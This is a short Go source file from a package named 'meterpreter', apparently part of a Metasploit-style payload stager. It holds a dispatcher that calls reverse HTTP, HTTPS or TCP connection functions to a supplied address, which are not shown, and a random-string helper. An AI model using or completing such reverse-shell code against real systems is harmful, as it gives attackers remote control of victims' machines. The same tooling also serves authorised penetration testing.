package meterpreter

import (
	"math/rand"
	"time"
)

func Meterpreter(connType, address string) (bool, error) {
	var (
		ok  bool
		err error
	)
	switch {
	case connType == "http" || connType == "https":
		ok, err = ReverseHttp(connType, address)
	case connType == "tcp":
		ok, err = ReverseTcp(address)
	default:
		ok = false
	}

	return ok, err
}

func GetRandomString(length int, charset string) string {
	var seed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	buf := make([]byte, length)
	for i := range buf {
		buf[i] = charset[seed.Intn(len(charset))]
	}
	return string(buf)
}
